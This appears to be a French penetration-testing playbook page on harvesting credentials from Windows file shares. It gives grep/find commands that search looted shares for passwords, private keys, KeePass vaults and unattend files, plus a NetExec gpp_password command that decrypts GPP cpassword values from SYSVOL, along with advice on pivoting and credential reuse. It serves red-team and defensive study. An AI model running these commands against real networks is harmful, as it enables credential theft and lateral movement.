---
order: 1
title: "Chasse aux identifiants : trouver mots de passe, clés et jetons dans les partages"
description: "Le contenu des partages est une source dense d'identifiants : fichiers de configuration et scripts avec des mots de passe embarqués, le cpassword de stratégie de groupe dans SYSVOL, clés privées et bases KeePass enregistrées, fichiers d'identifiants cloud, et fichiers de réponses unattend/sysprep. Une correspondance de motifs ciblée et la recherche de fichiers connus à travers les partages parcourus récupèrent des identifiants utilisables."
keywords:
  - chasse aux identifiants
  - cpassword
  - groups.xml
  - unattend
  - clés privées
---

# Chasse aux identifiants

Le butin de plus grande valeur dans les partages, ce sont les identifiants, et ils apparaissent sous des formes prévisibles. L'approche consiste à extraire les fichiers probables et à faire correspondre des motifs de façon agressive, et à rechercher spécifiquement les fichiers connus porteurs d'identifiants que Windows et les applications laissent dans les partages.

## Correspondance de motifs pour les secrets embarqués

```bash
# across downloaded share content
grep -rinE 'password|passwd|pwd=|secret|api[_-]?key|BEGIN (RSA|OPENSSH) PRIVATE KEY' ./loot
grep -rinE 'connectionstring|Data Source=|User Id=|Server=.*;Password=' ./loot
# config/script types that commonly carry them
find ./loot -iregex '.*\.\(config\|ini\|xml\|ps1\|bat\|cmd\|vbs\|json\|yml\|yaml\)$'
```

## Fichiers connus porteurs d'identifiants

```bash
# SYSVOL Group Policy Preferences cpassword (AES key is public -> decryptable)
#   \\<domain>\SYSVOL\<domain>\Policies\*\{Machine,User}\Preferences\*\Groups.xml
nxc smb <dc> -u user -p 'pass' -M gpp_password        # finds + decrypts cpassword
# unattend / sysprep answer files with local admin creds
find ./loot -iname 'unattend.xml' -o -iname 'sysprep.inf' -o -iname 'autounattend.xml'
# saved keys and secret stores
find ./loot -iname 'id_rsa' -o -iname '*.ppk' -o -iname '*.pem' -o -iname '*.kdbx'
# web/app config with DB and service creds
find ./loot -iname 'web.config' -o -iname '.env' -o -iname '*.rdp'
```

Le `cpassword` de stratégie de groupe est un classique : il était chiffré avec une clé que Microsoft a publiée, si bien que tout `Groups.xml` (ou fichier Preferences associé) dans `SYSVOL` contenant `cpassword` est trivialement déchiffrable en un identifiant utilisable (souvent administrateur local), et `SYSVOL` est lisible par tout utilisateur du domaine.

## Notes d'exploitation

- `SYSVOL` est lisible par tout utilisateur du domaine authentifié, si bien que la chasse au `cpassword` GPP est un gain précoce fiable là où subsistent d'anciens fichiers Preferences ; `gpp_password` les trouve et les déchiffre.
- Les fichiers de réponses unattend/sysprep contiennent fréquemment un mot de passe d'administrateur local réutilisé sur tout un déploiement, ce qui rend une seule découverte largement utile.
- Les clés privées et bases KeePass récupérées permettent de pivoter plus loin (SSH, déchiffrer le coffre hors ligne) ; les chaînes de connexion donnent un accès à la base de données.
- Réinjectez les identifiants récupérés dans l'[énumération des partages](../share-enumeration.md) en tant que nouvelle identité et dans le réseau plus large ; de nombreux identifiants trouvés dans les partages sont réutilisés.

## Outils

- [NetExec (gpp_password, spider_plus)](https://github.com/Pennyw0rth/NetExec)
- [Snaffler (targeted share credential hunting)](https://github.com/SnaffCon/Snaffler)

## Références

- [MITRE ATT&CK: credentials in files](https://attack.mitre.org/techniques/T1552/001/)
- [MS14-025 (Group Policy Preferences cpassword)](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)
